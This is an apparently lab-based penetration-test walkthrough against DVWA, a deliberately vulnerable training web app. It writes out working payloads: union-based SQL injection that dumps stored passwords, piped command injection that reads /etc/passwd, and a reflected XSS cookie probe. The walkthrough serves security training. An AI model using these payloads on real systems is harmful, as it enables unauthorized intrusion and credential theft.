# Mission Walkthrough — DVWA (Damn Vulnerable Web Application)
## Mission ID: 2026-03-13-001
## Target: 10.10.30.129
## Date: 2026-03-13

---

## 1. Initial Reconnaissance & Scanning
### 1.1 Host Discovery & Port Scan
Initial port scanning revealed only port 80/tcp as open.
```bash
nmap -sV -sC -p- 10.10.30.129
```
- Open Port: 80/tcp (Apache/2.4.25)

### 1.2 Directory Enumeration
Using directory scanning tools, the `/config/` directory was found to be publicly accessible with directory listing enabled.
- Discovery: `http://10.10.30.129/config/config.inc.php.bak`
- Action: Download and analyze the backup file for sensitive information.
- Result: Plaintext database credentials recovered.

## 2. Enumeration & Module Identification
The target application was identified as DVWA v1.10. Default credentials (admin/password) were used to authenticate.
- Modules in scope: SQL Injection, Command Injection, Reflected XSS.
- Initial check: Confirm the security level is set to LOW.

## 3. Exploitation Walkthrough

### 3.1 SQL Injection (Union-Based)
**Endpoint:** `/vulnerabilities/sqli/`
**Technique:** UNION SELECT extraction.
1. Confirm the number of columns in the original query:
   - `id=1' ORDER BY 2-- -` (Success)
   - `id=1' ORDER BY 3-- -` (Fail)
2. Perform UNION SELECT to dump data:
   - Payload: `id=999' UNION SELECT user,password FROM users-- -`
3. Result: Recovery of user credentials.

### 3.2 OS Command Injection
**Endpoint:** `/vulnerabilities/exec/`
**Technique:** Command chaining via pipe.
1. Test for command execution:
   - Input: `127.0.0.1|whoami`
   - Result: `www-data`
2. Perform arbitrary command execution:
   - Input: `127.0.0.1|cat /etc/passwd`
3. Result: System-level user enumeration.

### 3.3 Reflected XSS (Session Hijacking)
**Endpoint:** `/vulnerabilities/xss_r/`
**Technique:** Script tag injection.
1. Test for reflected XSS:
   - Payload: `<script>alert(document.cookie)</script>`
2. Check for cookie security:
   - Observe that `PHPSESSID` does not have the `HttpOnly` flag.
3. Result: Confirmation that session cookies can be stolen via JavaScript.

---
**Mission Completed Successfully.**
